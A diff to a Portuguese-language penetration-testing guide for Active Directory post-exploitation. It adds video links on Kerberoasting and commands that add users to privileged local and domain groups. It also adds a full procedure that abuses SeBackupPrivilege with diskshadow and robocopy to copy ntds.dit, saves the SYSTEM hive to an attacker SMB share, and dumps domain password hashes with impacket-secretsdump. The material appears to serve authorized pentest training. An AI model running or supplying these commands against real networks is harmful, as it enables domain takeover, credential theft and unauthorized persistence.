@@ -15,7 +15,7 @@ Aqui já podemos levar em conta que já temos uma credencial válida de domínio
 - [ ] [**Over Pass the Hash**](#over-pass-the-hash)
 - [ ] [**Silver Ticket**](#silver-ticket)
 - [ ] [**Adicionar usuário privilegiado**](#adicionar-usuario-privilegiado)
-
+- [ ] [**Permissionamento de usuário**](#permissionamento-de-usuario)
 
 ## Enumeração do domínio com Bloodhound
 
@@ -237,6 +237,15 @@ ou
 
     python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~dominio.com-dominio.com.kirbi
 
+### Referência em vídeo
+
+![type:video](https://youtube.com/embed/dZKelLeyEzQ)
+
+[Introduçao ao kerberoast](https://www.youtube.com/watch?v=dZKelLeyEzQ&t=0s)  
+[Configuração do ambiente](https://www.youtube.com/watch?v=dZKelLeyEzQ&t=55s)  
+[Kerberoasting com Rubeus no Windows](https://www.youtube.com/watch?v=dZKelLeyEzQ&t=82s)  
+[Encaminhamento de porta para chegar no Domain Controller pelo Kali Linux (port forwarding)](https://www.youtube.com/watch?v=dZKelLeyEzQ&t=260s)  
+[Kerberoasting com Impacket no Kali Linux](https://www.youtube.com/watch?v=dZKelLeyEzQ&t=500s)  
 
 ## lsass dump
 
@@ -386,4 +395,67 @@ Esse tipo de ataque é interessante para fazer lateralização, dado que vários
 
 ## Adicionar usuário privilegiado
 
-    net user <usuario> <senha> /add
+    net user <usuario> <senha> /add /domain
+    
+Adicionando em um grupo privilegiado
+
+    net localgroup Administrators /add <usuario>
+
+ou em um grupo de domínio
+
+    net group "Exchange Windows Permissions" /add <usuario>
+
+## Permissionamento de usuário
+
+Esse ponto consistem em obter os hashes de senha dos usuários do AD utilizando a permissão de usuário SeBackupPrivilege do usuário:
+
+Detectamos isso com o comando:
+
+    whoami /priv
+
+![qownnotes-media-GRqaSH](../../../media/qownnotes-media-GRqaSH.png)
+
+Depois disso, temos de criar um scriptizinho:
+
+    cat test.dsh
+
+```
+set context persistent nowriters
+add volume c: alias test
+create
+expose %test% z:
+```
+
+Adequando o arquivo para leitura correto do SO Windows:
+
+    uni2dos test.dsh
+
+fazer o upload do arquivo na máquina alvo e executar os seguintes comandos:
+
+    diskshadow /s test.dsh
+    robocopy /b z:\windows\ntds . ntds.dit
+    
+
+Fazer o download do arquivo ntds.dit para a máquina do atacante. Além deste arquivo, vamos precisar do SYSTEM tabém, que podemos obter por meio do seguinte comando:
+
+(Se necessário, fornecer credencial):
+
+    net use \\10.0.0.1\smb /user:test test
+
+depois:
+
+    reg save HKLM\SYSTEM \\10.0.0.1\smb\system
+
+
+
+claro que temos que estar com o servidor smb de pé (se necessário, colocar senha e usuário):
+
+    impacket-smbserver -smb2support smb .
+
+ou
+
+    impacket-smbserver -smb2support -username test -password test smb .
+
+Assim que os arquivos necessários estiverem an máquina do atacante, considere o seguinte comando:
+
+    impacket-secretsdump local -ntds ntds.dit -system system
